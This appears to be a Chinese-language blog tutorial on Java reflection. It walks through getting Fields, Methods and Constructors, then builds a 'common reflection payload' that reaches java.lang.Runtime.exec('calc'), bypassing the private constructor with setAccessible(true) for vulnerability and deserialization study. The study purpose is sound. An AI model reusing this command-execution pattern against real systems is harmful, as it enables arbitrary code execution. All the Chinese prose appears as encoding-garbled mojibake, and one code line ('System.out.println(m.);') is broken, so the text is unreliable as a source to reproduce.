å°±ä¸éœ€è¦importå¯¼å…¥å…¶ä»–ç±»ï¼Œå¯ä»¥åŠ è½½æˆ‘ä»¬ä»»æ„çš„ç±»ã€‚ ä½¿ç”¨ç¬¬äºŒç§ç±».classå±æ€§ï¼Œéœ€è¦å¯¼å…¥ç±»çš„åŒ…ï¼Œä¾èµ–æ€§å¤ªå¼ºï¼Œåœ¨å¤§å‹é¡¹ç›®ä¸­å®¹æ˜“æŠ›å‡ºç¼–è¯‘é”™è¯¯ï¼› ä½¿ç”¨ç¬¬ä¸‰ç§å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•ï¼Œéœ€è¦æœ¬èº«åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œæœ¬èº«å°±æ²¡æœ‰äº†ä½¿ç”¨åå°„æœºåˆ¶æ„ä¹‰ã€‚ æ‰€ä»¥æˆ‘ä»¬åœ¨è·å–classå¯¹è±¡ä¸­ï¼Œä¸€èˆ¬ä½¿ç”¨ç¬¬ä¸€ç§Class.forNameæ–¹æ³•å»è·å–ã€‚\nè·å–æˆå‘˜å˜é‡Field è·å–æˆå‘˜å˜é‡Fieldä½äºjava.lang.reflect.FieldåŒ…ä¸­\nField[] getFields() ï¼šè·å–æ‰€æœ‰publicä¿®é¥°çš„æˆå‘˜å˜é‡\nField[] getDeclaredFields() è·å–æ‰€æœ‰çš„æˆå‘˜å˜é‡ï¼Œä¸è€ƒè™‘ä¿®é¥°ç¬¦\nField getField(String name) è·å–æŒ‡å®šåç§°çš„ publicä¿®é¥°çš„æˆå‘˜å˜é‡\nField getDeclaredField(String name) è·å–æŒ‡å®šçš„æˆå‘˜å˜é‡\nç”¨ä¸€ä¸ªä¾‹å­ç†è§£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import java.lang.reflect.Field; public class FieldTest { public String name; public String profession; protected int age; private String number; char sex; public static void main(String[] args){ try{ Class c1 = Class.forName(\u0026#34;com.dan.FieldTest\u0026#34;); // åˆ›å»ºClasså¯¹è±¡ Field[] fieldArray1 = c1.getDeclaredFields(); //è·å–å…¨éƒ¨æˆå‘˜å˜é‡ Field[] fieldArray2 = c1.getFields();// è·å–å…¨éƒ¨publicæˆå‘˜å˜é‡ for (Field field : fieldArray1){ System.out.println(field.getName()); } System.out.println(\u0026#34;-------åˆ†å‰²çº¿---------\u0026#34;); for (Field field : fieldArray2){ System.out.println(field.getName()); } System.out.println(\u0026#34;-------åˆ†å‰²çº¿---------\u0026#34;); Field fieldArray3 = c1.getField(\u0026#34;name\u0026#34;); // è·å–æŒ‡å®šåç§°çš„publicä¿®é¥°çš„æˆå‘˜å˜é‡ System.out.println(fieldArray3.getName()); System.out.println(\u0026#34;-------åˆ†å‰²çº¿---------\u0026#34;); Field fieldArray4 = c1.getDeclaredField(\u0026#34;number\u0026#34;); // è·å–æŒ‡å®šçš„æˆå‘˜å˜é‡ System.out.println(fieldArray4.getName()); } catch (Exception e) { e.printStackTrace(); } } } è·å–æˆå‘˜æ–¹æ³•Method Method getMethod(String name, ç±»\u003c?\u003e\u0026hellip; parameterTypes) //è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„publicæ–¹æ³•\nMethod getDeclaredMethod(String name, ç±»\u003c?\u003e\u0026hellip; parameterTypes) //è¿”å›è¯¥ç±»æ‰€å£°æ˜çš„æ‰€æœ‰æ–¹æ³•\n//ç¬¬ä¸€ä¸ªå‚æ•°è·å–è¯¥æ–¹æ³•çš„åå­—ï¼Œç¬¬äºŒä¸ªå‚æ•°è·å–æ ‡è¯†è¯¥æ–¹æ³•çš„å‚æ•°ç±»å‹\nMethod[] getMethods() //è·å–æ‰€æœ‰çš„publicæ–¹æ³•ï¼ŒåŒ…æ‹¬ç±»è‡ªèº«å£°æ˜çš„publicæ–¹æ³•ï¼Œçˆ¶ç±»ä¸­çš„publicæ–¹æ³•ã€å®ç°çš„æ¥å£æ–¹æ³•\nMethod[] getDeclaredMethods() // è·å–è¯¥ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 import java.lang.reflect.Method; public class MethodTest { public void study(String s) { System.out.println(\u0026#34;å­¦ä¹ ä¸­...\u0026#34; + s); } protected void run() { System.out.println(\u0026#34;è·‘æ­¥ä¸­...\u0026#34;); } void eat() { System.out.println(\u0026#34;åƒé¥­ä¸­...\u0026#34;); } private String sleep(int age) { System.out.println(\u0026#34;ç¡çœ ä¸­...\u0026#34; + age); return \u0026#34;sleep\u0026#34;; } public static void main(String[] args) { try { Class c = Class.forName(\u0026#34;com.dan.MethodTest\u0026#34;); // åˆ›å»ºClasså¯¹è±¡ Method[] methods1 = c.getDeclaredMethods(); // è·å–æ‰€æœ‰è¯¥ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³• Method[] methods2 = c.getMethods(); // è·å–æ‰€æœ‰çš„publicæ–¹æ³•ï¼ŒåŒ…æ‹¬ç±»è‡ªèº«å£°æ˜çš„publicæ–¹æ³•ï¼Œçˆ¶ç±»ä¸­çš„publicæ–¹æ³•ã€å®ç°çš„æ¥å£æ–¹æ³• for (Method m:methods1) { System.out.println(m.); } System.out.println(\u0026#34;-------åˆ†å‰²çº¿---------\u0026#34;); for (Method m:methods2) { System.out.println(m); } System.out.println(\u0026#34;-------åˆ†å‰²çº¿---------\u0026#34;); Method methods3 = c.getMethod(\u0026#34;study\u0026#34;, String.class); // è·å–studyæ–¹æ³• System.out.println(methods3); System.out.println(\u0026#34;-------åˆ†å‰²çº¿---------\u0026#34;); Method method4 = c.getDeclaredMethod(\u0026#34;sleep\u0026#34;, int.class); // è·å–sleepæ–¹æ³• System.out.println(method4); } catch (Exception e) { e.printStackTrace(); } } } è¿è¡Œç»“æœï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 //public static void com.dan.MethodTest.main(java.lang.String[]) //protected void com.dan.MethodTest.run() //private java.lang.String com.dan.MethodTest.sleep(int) //public void com.dan.MethodTest.study(java.lang.String) //void com.dan.MethodTest.eat() //-------åˆ†å‰²çº¿--------- //public static void com.dan.MethodTest.main(java.lang.String[]) //public void com.dan.MethodTest.study(java.lang.String) //public final void java.lang.Object.wait(long,int) throws java.lang.InterruptedException //public final void java.lang.Object.wait() throws java.lang.InterruptedException //public final native void java.lang.Object.wait(long) throws java.lang.InterruptedException //public boolean java.lang.Object.equals(java.lang.Object) //public java.lang.String java.lang.Object.toString() //public native int java.lang.Object.hashCode() //public final native java.lang.Class java.lang.Object.getClass() //public final native void java.lang.Object.notify() //public final native void java.lang.Object.notifyAll() //-------åˆ†å‰²çº¿--------- //public void com.dan.MethodTest.study(java.lang.String) //-------åˆ†å‰²çº¿--------- //private java.lang.String com.dan.MethodTest.sleep(int) // //Process finished with exit code 0 è·å–æ„é€ å‡½æ•° Constructor\u003c?\u003e[] getConstructors() ï¼šåªè¿”å›publicæ„é€ å‡½æ•°\nConstructor\u003c?\u003e[] getDeclaredConstructors() ï¼šè¿”å›æ‰€æœ‰æ„é€ å‡½æ•°\nConstructor\u0026lt;\u0026gt; getConstructor(ç±»\u003c?\u003e\u0026hellip; parameterTypes) : åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„publicæ„é€ å‡½æ•°\nConstructor\u0026lt;\u0026gt; getDeclaredConstructor(ç±»\u003c?\u003e\u0026hellip; parameterTypes) ï¼š åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„æ„é€ å‡½æ•°\nä¾‹å­æ€»æ¯”æ–‡å­—å¥½ç†è§£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 import java.lang.reflect.Constructor; public class ConstructorTest { public ConstructorTest() { System.out.println(\u0026#34;æ— å‚æ„é€ å‡½æ•°\u0026#34;); } public ConstructorTest(String name) { System.out.println(\u0026#34;æœ‰å‚æ„é€ å‡½æ•°\u0026#34; + name); } private ConstructorTest(boolean n) { System.out.println(\u0026#34;ç§æœ‰æ„é€ å‡½æ•°\u0026#34;); } public static void main(String[] args) { try { Class c1 = Class.forName(\u0026#34;com.dan.ConstructorTest\u0026#34;); Constructor[] constructors1 = c1.getDeclaredConstructors(); Constructor[] constructors2 = c1.getConstructors(); for (Constructor c : constructors1) { System.out.println(c); } System.out.println(\u0026#34;-------åˆ†å‰²çº¿---------\u0026#34;); for (Constructor c : constructors2) { System.out.println(c); } System.out.println(\u0026#34;-------åˆ†å‰²çº¿---------\u0026#34;); Constructor constructors3 = c1.getConstructor(String.class); System.out.println(constructors3); System.out.println(\u0026#34;-------åˆ†å‰²çº¿---------\u0026#34;); Constructor constructors4 = c1.getDeclaredConstructor(boolean.class); System.out.println(constructors4); } catch (Exception e) { e.printStackTrace(); } } } è·å–å¯¹è±¡ å…ˆè·å–ç±»çš„ Class å¯¹è±¡å®ä¾‹ Class clz = Class.forName(\u0026quot;com.api.Apple\u0026quot;);\næ ¹æ® Class å¯¹è±¡å®ä¾‹è·å– Constructor å‡½æ•° Constructor appleConstructor = clz.getConstructor();\nä½¿ç”¨ Constructor å¯¹è±¡çš„ newInstance æ–¹æ³•è·å–åå°„ç±»å¯¹è±¡ Apple appleObj = (Apple)appleConstructor.newInstance();\næˆ–è€…ä¹Ÿå¯ä»¥ä½¿ç”¨ Classå¯¹è±¡ çš„newInstance()æ–¹æ³•æ¥è¿›è¡Œåˆ›å»ºç±»å¯¹è±¡\nApple appleObj = (Apple)clz.newInstance();\nåŒºåˆ«åœ¨äºé€šè¿‡ Constructor å¯¹è±¡åˆ›å»ºç±»å¯¹è±¡å¯ä»¥é€‰æ‹©ç‰¹å®šæ„é€ æ–¹æ³•ï¼Œè€Œé€šè¿‡ Class å¯¹è±¡åˆ™åªèƒ½ä½¿ç”¨é»˜è®¤çš„æ— å‚æ•°æ„é€ æ–¹æ³•ã€‚ä¸‹é¢çš„ä»£ç æ˜¯ä½¿ç”¨ä¸€ä¸ªæœ‰å‚æ•°çš„æ„é€ æ–¹æ³•è¿›è¡Œäº†ç±»å¯¹è±¡çš„åˆå§‹åŒ–\n1 2 3 Class clz = Apple.class; Constructor constructor = clz.getConstructor(String.class, int.class); Apple apple = (Apple)constructor.newInstance(\u0026#34;çº¢å¯Œå£«\u0026#34;, 15); å¸¸ç”¨çš„æ˜¯å¦‚ä¸‹å®ä¾‹ï¼š\n1 2 Class clz = Class.forName(\u0026#34;com.api.Apple\u0026#34;); // åˆ›å»ºClasså¯¹è±¡ Apple appleObj = (Apple) clz.newInstance(); // åˆ›å»ºç±»å¯¹è±¡ è°ƒç”¨æ–¹æ³•æ­¥éª¤ è·å–å¯¹è±¡ä½¿ç”¨çš„æ˜¯ newInstance()ï¼Œé‚£ä¹ˆè°ƒç”¨å‡½æ•°ä½¿ç”¨çš„å°±æ˜¯invoke()\ninvokeæ–¹æ³•ä½äºjava.lang.reflect.Methodç±»ä¸­ï¼Œç”¨äºæ‰§è¡ŒæŸä¸ªçš„å¯¹è±¡çš„ç›®æ ‡æ–¹æ³•ã€‚ä¸€èˆ¬ä¼šå’ŒgetMethodæ–¹æ³•é…åˆè¿›è¡Œè°ƒç”¨ã€‚\ninvokeä½¿ç”¨å°Tipsï¼š\npublic Object invoke(Object obj, Object... args)\nobjï¼šä»ä¸­è°ƒç”¨åº•å±‚æ–¹æ³•çš„å¯¹è±¡ï¼Œå¿…é¡»æ˜¯å®ä¾‹åŒ–å¯¹è±¡ å¦‚æœè°ƒç”¨çš„è¿™ä¸ªæ–¹æ³•æ˜¯æ™®é€šæ–¹æ³•**ï¼Œ**ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ç›®æ ‡ç±»å®ä¾‹åŒ–å¯¹è±¡ï¼› å¦‚æœè°ƒç”¨çš„è¿™ä¸ªæ–¹æ³•æ˜¯é™æ€æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯Classå¯¹è±¡ï¼›\nargsï¼š ç”¨äºæ–¹æ³•çš„è°ƒç”¨ï¼Œæ˜¯ä¸€ä¸ªobjectçš„æ•°ç»„ï¼Œå‚æ•°æœ‰å¯èƒ½æ˜¯å¤šä¸ª\nåŸºæœ¬æ­¥éª¤\nè·å–ç±»çš„ Class å¯¹è±¡å®ä¾‹ Class clz = Class.forName(\u0026quot;com.api.Apple\u0026quot;);\nè·å–æ–¹æ³•çš„ Method å¯¹è±¡ Method setPriceMethod = clz.getMethod(\u0026quot;setPrice\u0026quot;, int.class);\nåˆ©ç”¨ Method å¯¹è±¡çš„ invoke æ–¹æ³•è°ƒç”¨æ–¹æ³•ï¼ˆæœ¬ä¾‹å­éœ€è¦æå‰å‡†å¤‡å®ä¾‹åŒ–å¯¹è±¡ï¼‰ setPriceMethod.invoke(appleObj, 14);\nè°ƒç”¨æ–¹æ³•å®Œæ•´å°ä¾‹å­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package com.dan; import java.lang.reflect.Method; public class ReflectTest { public void reflectMethod() { System.out.println(\u0026#34;åå°„æµ‹è¯•æˆåŠŸ!!!\u0026#34;); } public static void main(String[] args) { try { Class c = Class.forName(\u0026#34;com.dan.ReflectTest\u0026#34;); // åˆ›å»ºClasså¯¹è±¡ Object m = c.newInstance(); // åˆ›å»ºç±»å®ä¾‹å¯¹è±¡ Method method = c.getMethod(\u0026#34;reflectMethod\u0026#34;); // è·å–reflectMethodæ–¹æ³• method.invoke(m); // è°ƒç”¨ç±»å®ä¾‹å¯¹è±¡æ–¹æ³• } catch (Exception e) { e.printStackTrace(); } } } â€‹\tä¸Šé¢è®²è¿°äº†åå°„æœºåˆ¶æµç¨‹æ¦‚å¿µå’ŒåŸºæœ¬ä½¿ç”¨æ–¹æ³•ï¼Œä»Classå¯¹è±¡è·å–ï¼Œåˆ°è·å–æˆå‘˜å˜é‡ã€æˆå‘˜æ–¹æ³•å’Œæ„é€ å‡½æ•°ï¼Œæ¥ç€æ˜¯newInstanceåˆ›å»ºç±»å¯¹è±¡å’Œinvokeæ–¹æ³•ï¼Œæœ€åæ˜¯ä¸€ä¸ªç®€å•åå°„ä¾‹å­çš„ç»„æˆã€‚\nå›å½’åˆ°æ¼æ´å­¦ä¹ ä¸­ï¼Œçœ‹çœ‹å¦‚ä½•ä½¿ç”¨javaåå°„ä¸­å¦‚ä½•è·å–Runtimeç±»æ¥å‘½ä»¤æ‰§è¡Œ\n1 2 3 4 5 6 7 8 9 10 import java.lang.reflect.Method; public class CommandExc { public static void main(String[] args) throws Exception { Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Object b = a.newInstance(); Method c = a.getMethod(\u0026#34;exec\u0026#34;,String.class); c.invoke(b,\u0026#34;calc\u0026#34;); } } ä¸Šé¢çš„ä¾‹å­ä¼šæŠ¥é”™ï¼š\nä½†æˆ‘ä»¬å‘ç°äº†ä½¿ç”¨newInstanceäº§ç”Ÿäº†æŠ¥é”™çš„è¯ï¼Œè€Œå¾€å¾€å…¶å¯èƒ½æ˜¯ä»¥ä¸‹åŸå› æœªèƒ½å®ç°ã€‚\n1ã€ä½¿ç”¨çš„ç±»æ²¡æœ‰æ— å‚æ„é€ å‡½æ•° 2ã€ä½¿ç”¨çš„ç±»æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„\næ„é€ å‡½æ•°ç§æœ‰åŒ– ä¸Šä¾‹æŠ¥é”™æ˜¯å› ä¸ºæ„é€ å‡½æ•°ç§æœ‰ï¼Œæ„é€ å‡½æ•°ç§æœ‰æœ‰å¦‚ä¸‹ä½œç”¨ï¼š\nå•ä¾‹æ¨¡å¼\nå•ä¾‹æ¨¡å¼ä¸»è¦æœ‰3ä¸ªç‰¹ç‚¹ï¼š\nç±»çš„å†…éƒ¨åŒ…æ‹¬ä¸€ä¸ªç±»çš„å®ä¾‹ï¼Œå¹¶ä¸”ä¸ºstaticç±»å‹\næ„é€ å‡½æ•°ä¸ºç§æœ‰\né€šè¿‡æä¾›ä¸€ä¸ªè·å–å®ä¾‹çš„æ–¹æ³•ï¼Œæ¯”å¦‚getInstanceï¼Œè¯¥æ–¹æ³•ä¹Ÿä¸ºstaticç±»å‹ã€‚ è°ƒç”¨çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŸäº›ç‰¹æ®Šé™æ€å‡½æ•°ä¾‹å¦‚Singleton instance = Singleton.getInstance();æ¥è·å¾—å®ä¾‹åŒ–çš„å¯¹è±¡\nå•ä¾‹æ¨¡å¼çš„ä½¿ç”¨ï¼š å¾ˆå¤šæ—¶å€™ï¼Œæˆ‘ä»¬åªéœ€è¦ä¸€ä¸ªå¯¹è±¡å°±å¯ä»¥äº†ï¼Œä¸å¸Œæœ›ç”¨æˆ·æ¥æ„é€ å¯¹è±¡ï¼Œæ¯”å¦‚çº¿ç¨‹æ± ï¼Œé©±åŠ¨ï¼Œæ˜¾ç¤ºå™¨ç­‰ã€‚å¦‚æœæŠŠæ„é€ å‡½æ•°ç§æœ‰ï¼Œé‚£ä¹ˆå¾ˆå¤šç¨‹åºéƒ½å¯ä»¥å¾—åˆ°å…¶å®ä¾‹ï¼Œå°†ä¼šå¸¦æ¥æ··ä¹±ã€‚\né˜²æ­¢å®ä¾‹åŒ–\nåœ¨Javaçš„å·¥å…·ç±»ä¸­ï¼Œæœ‰å¾ˆå¤šå°±æ˜¯åˆ©ç”¨è¿™ç§æ–¹æ³•\nä¸€ä¸ªå·¥å…·ç±»Utilsï¼Œé‡Œé¢å«æœ‰å¾ˆå¤šé™æ€å‡½æ•°æˆ–è€…é™æ€å˜é‡ï¼Œç”±äºé™æ€çš„åŸå› ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥é€šè¿‡ç±»åæ¥è®¿é—®ï¼Œè¿™æ ·ï¼Œæˆ‘ä»¬å°±æ²¡æœ‰å¿…è¦å®ä¾‹åŒ–å®ƒä»¬ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†å…¶æ„é€ å‡½æ•°è®¾ç½®ä¸ºç§æœ‰ï¼Œè¿™æ ·å°±é˜²æ­¢ç”¨æˆ·æ»¥ç”¨ã€‚\nRuntimeä¹Ÿæ˜¯ä¸€ä¸ªå·¥å…·ç±»ï¼Œæ‰€ä»¥æ„é€ å‡½æ•°æœ‰ç§æœ‰çš„å¿…è¦\né‚£æˆ‘ä»¬åº”è¯¥æ€ä¹ˆæ„é€ å‘¢ï¼ŸåŸæœ¬å¼¹è®¡ç®—å™¨åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š\nRuntime.getRuntime().exec(\u0026quot;calc\u0026quot;);\nå¯ä»¥çœ‹åˆ°æ˜¯é€šè¿‡getRuntime()æ–¹æ³•è·å¾—çš„å®ä¾‹åŒ–å¯¹è±¡\né‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å…ˆä½¿ç”¨åå°„è°ƒç”¨é™æ€æ–¹æ³•è·å¾—å¯¹è±¡åå†æ‰§è¡Œexec()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.lang.reflect.Method; public class CommandExc { public static void main(String[] args) throws Exception { // Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); // Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); // Object b = a.newInstance(); // Method c = a.getMethod(\u0026#34;exec\u0026#34;,String.class); // c.invoke(b,\u0026#34;calc\u0026#34;); Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Method rundan = a.getMethod(\u0026#34;getRuntime\u0026#34;); Object b = rundan.invoke(a); Method run1 = a.getMethod(\u0026#34;exec\u0026#34;, String.class); run1.invoke(b,\u0026#34;calc\u0026#34;); } } æ­¤ä¾‹ä¾¿å¯ä»¥å¼¹å‡ºè®¡ç®—æœºäº†\nå¦‚æœå°†è¿™äº›ä»£ç ç®€åŒ–ä¸€ä¸‹ï¼Œå°±å¯ä»¥å¾—åˆ°\n1 2 Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); a.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(a.getMethod(\u0026#34;getRuntime\u0026#34;).invoke(a),\u0026#34;calc\u0026#34;); å¸¸è§çš„åå°„payload\nå¦‚æœå°±æƒ³ä½¿ç”¨newInstance()æ¥è·å¾—æ„é€ å‘¢ï¼Œåœ¨ä¹‹å‰è·å¾—å¯¹è±¡ä¸­æœ‰æåˆ°\nä½¿ç”¨ Constructor å¯¹è±¡çš„ newInstance æ–¹æ³•è·å–åå°„ç±»å¯¹è±¡\næ‰€ä»¥å¯ä»¥å…ˆè¯•è¯•\n1 2 3 4 5 6 7 8 9 10 11 import java.lang.reflect.Constructor; public class CommandExc { public static void main(String[] args) throws Exception { Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Constructor cs = a.getDeclaredConstructor(); System.out.println(cs); Object o = cs.newInstance(); a.getMethod(\u0026#34;exec\u0026#34;, String[].class).invoke(o,\u0026#34;calc\u0026#34;); } } ä½†æ˜¯ä¾æ—§æŠ¥é”™ï¼š\nä½¬è¯´éœ€è¦é€šè¿‡setAccessible(true)æ¥çªç ´è®¿é—®æƒé™çš„æ£€æŸ¥\nâ€‹\tåœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä½¿ç”¨åå°„æœºåˆ¶ä¸èƒ½å¯¹ç±»çš„ç§æœ‰privateå­—æ®µè¿›è¡Œæ“ä½œï¼Œç»•è¿‡ç§æœ‰æƒé™çš„è®¿é—®ã€‚ä½†ä¸€äº›ç‰¹æ®Šåœºæ™¯å­˜åœ¨ä¾‹å¤–çš„æ—¶å€™ï¼Œæ¯”å¦‚æˆ‘ä»¬è¿›è¡Œåºåˆ—åŒ–æ“ä½œçš„æ—¶å€™ï¼Œéœ€è¦å»è®¿é—®è¿™äº›å—é™çš„ç§æœ‰å­—æ®µï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨AccessibleObjectä¸Šçš„setAccessible()æ–¹æ³•æ¥å…è®¸è®¿é—®ã€‚\nâ€‹\tJava.lang.reflect.AccessibleObject ç±»æ˜¯Fieldï¼ŒMethodå’ŒConstructorç±»å¯¹è±¡çš„åŸºç±»ï¼Œå®ƒæä¾›äº†æ ‡è®°åå°„å¯¹è±¡çš„èƒ½åŠ›ï¼Œä»¥æŠ‘åˆ¶åœ¨ä½¿ç”¨æ—¶ä½¿ç”¨é»˜è®¤Javaè¯­è¨€è®¿é—®æ§åˆ¶æ£€æŸ¥ï¼Œä»è€Œèƒ½å¤Ÿä»»æ„è°ƒç”¨è¢«ç§æœ‰åŒ–ä¿æŠ¤çš„æ–¹æ³•ã€åŸŸå’Œæ„é€ å‡½æ•°ï¼ŒåŒæ—¶ä¸Šè¿°çš„åå°„ç±»ä¸­çš„Fieldï¼ŒMethodå’ŒConstructorç»§æ‰¿è‡ªAccessibleObjectã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨è¿™äº›ç±»æ–¹æ³•åŸºç¡€ä¸Šè°ƒç”¨setAccessible()æ–¹æ³•ï¼Œæ—¢å¯å¯¹è¿™äº›ç§æœ‰å­—æ®µè¿›è¡Œæ“ä½œã€‚\nsetAccessible()æ˜¯AccessibleObjectç±»çš„publicå‡½æ•°ï¼Œè¯¥ç±»è¢«Executableç»§æ‰¿ï¼Œä¹‹åExecutableåˆè¢«Constructorç»§æ‰¿\næ‰€ä»¥å¯ä»¥ä½¿ç”¨Fieldï¼ŒMethodå’ŒConstructorç±»çš„å®ä¾‹åŒ–å¯¹è±¡å»è®¿é—®è¯¥å‡½æ•°ï¼Œä»£ç æ”¹è¿›ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import java.lang.reflect.Constructor; public class CommandExc { public static void main(String[] args) throws Exception { Class a = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Constructor cs = a.getDeclaredConstructor(); cs.setAccessible(true); Object o = cs.newInstance(); a.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(o,\u0026#34;calc\u0026#34;); } } è¿˜æ˜¯æŠ¥é”™ï¼Œï¼Œï¼Œï¼Œ\nçŒœæµ‹æ˜¯Javaç‰ˆæœ¬è¿‡æ–°ï¼Œè§£å†³åŠæ³•ï¼š\nå¦‚æœæ²¡æœ‰ç±»ä¼¼æˆ‘ä¸€æ ·çš„æ–¹æ¡†çš„è¯ï¼Œæ‰¾åˆ° Modify options ï¼Œå»é‡Œé¢æŠŠ\nè¿™ä¸ªå‹¾é€‰ä¸Šå°±æœ‰äº†ï¼Œæ–¹æ¡†é‡Œå¡«--add-opens java.base/java.lang=ALL-UNNAMED\næœ€åè¿è¡Œï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨\nâ€‹\tåœ¨å®é™…åˆ©ç”¨åœºæ™¯å½“ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸åˆ©ç”¨Javaåå°„æœºåˆ¶æ¥ç»•è¿‡ä¸€äº›å®‰å…¨æƒé™æœºåˆ¶æ£€æŸ¥ï¼Œå¦‚è·å–privateæƒé™çš„æ–¹æ³•å’Œå±æ€§ã€‚æœ¬è´¨å°±æ˜¯æˆ‘ä»¬ç»•è¿‡è®¿é—®å®‰å…¨æ£€æŸ¥ã€‚æ‰€ä»¥é€šè¿‡javaåå°„æœºåˆ¶çš„å­¦ä¹ ï¼Œèƒ½å¤Ÿä¸ºæˆ‘ä»¬ä¸ºæˆ‘ä»¬åé¢çš„javaæ¼æ´åˆ†æè°ƒè¯•ï¼Œjavaæ¼æ´pocæµ‹è¯•å’ŒæœåŠ¡ç«¯æ¨¡æ¿å¼•æ“æ³¨å…¥ç­‰æœ‰ç€ååˆ†é‡è¦çš„æ„ä¹‰ã€‚\næ³›å‹ å…³äºæ³›å‹çš„ä»‹ç»å¯ä»¥å‚è€ƒé“¾æ¥ï¼ˆJavaæ³›å‹è¯¦è§£ï¼Œå²ä¸Šæœ€å…¨å›¾æ–‡è¯¦è§£ï¼‰\nç›¸å…³è¡¥å…… Fieldç±»ç²—ç•¥ç†è§£\nâ€‹\tJavaä¸­çš„Fieldç±»æ˜¯åå°„æœºåˆ¶çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒçš„è®¾è®¡åˆè¡·æ˜¯ä¸ºäº†åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°è·å–å’Œæ“ä½œç±»çš„æˆå‘˜å˜é‡ï¼ŒåŒ…æ‹¬ç§æœ‰å˜é‡ã€‚ä½¿ç”¨Fieldç±»å¯ä»¥è·å–ç±»ä¸­çš„æ‰€æœ‰å˜é‡ä¿¡æ¯ï¼ŒåŒ…æ‹¬å˜é‡åã€ç±»å‹ã€è®¿é—®ä¿®é¥°ç¬¦ç­‰ï¼Œå¹¶å¯ä»¥é€šè¿‡å®ƒä»¬è¿›è¡Œè¯»å–ã€ä¿®æ”¹æˆ–è®¾ç½®æ–°çš„å€¼ã€‚ â€‹\tFieldç±»çš„è®¾è®¡ä½¿å¾—å¼€å‘è€…å¯ä»¥åœ¨è¿è¡Œæ—¶è·å–å’Œæ“ä½œç±»çš„æˆå‘˜å˜é‡ï¼Œè¿™åœ¨æŸäº›æƒ…å†µä¸‹æ˜¯éå¸¸æœ‰ç”¨çš„ï¼Œä¾‹å¦‚ï¼š\nå½“éœ€è¦é€šè¿‡åå°„è·å–æˆ–è®¾ç½®æŸä¸ªç±»çš„ç§æœ‰å˜é‡æ—¶ï¼› å½“éœ€è¦åŠ¨æ€åœ°åˆ›å»ºå¯¹è±¡æˆ–è€…é€šè¿‡åå°„è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•æ—¶ï¼Œéœ€è¦è®¿é—®å¯¹è±¡ä¸­çš„æˆå‘˜å˜é‡ï¼› å½“éœ€è¦å®ç°æŸäº›è‡ªå®šä¹‰çš„åºåˆ—åŒ–æˆ–è€…ååºåˆ—åŒ–æœºåˆ¶æ—¶ï¼Œéœ€è¦è·å–æˆ–è®¾ç½®å¯¹è±¡ä¸­çš„æˆå‘˜å˜é‡ã€‚ å› æ­¤ï¼ŒFieldç±»çš„è®¾è®¡åˆè¡·æ˜¯ä¸ºäº†æä¾›ä¸€ç§æ–¹ä¾¿çš„æ–¹å¼ï¼Œä½¿å¾—å¼€å‘è€…å¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°è·å–å’Œæ“ä½œç±»çš„æˆå‘˜å˜é‡ã€‚\nSerialCallbackContextç±»ç†è§£\nctx æ˜¯ä¸€ä¸ª SerialCallbackContext ç±»å¯¹è±¡ï¼Œ SerialCallbackContextç±»æ˜¯å†…éƒ¨ç±»ï¼Œæ— æ³•åœ¨åŒ…ï¼ˆjava.ioï¼‰å¤–å¼•ç”¨ï¼Œä¸”è¯¥ç±»ä¸ºfinalï¼Œæ— æ³•è¢«ç»§æ‰¿ï¼Œè¯¥ç±»çš„æè¿°ï¼š\nå¤§æ„å°±æ˜¯\nä»å¯¹è±¡æµå‘ä¸Šè°ƒç”¨ç±»å®šä¹‰çš„readObject/writeObjectæ–¹æ³•æ—¶çš„ä¸Šä¸‹æ–‡ã€‚ä¿å­˜å½“å‰è¢«ååºåˆ—åŒ–çš„å¯¹è±¡å’Œå½“å‰ç±»çš„æè¿°ç¬¦ã€‚è¿™ä¸ªä¸Šä¸‹æ–‡è·Ÿè¸ªæ„é€ 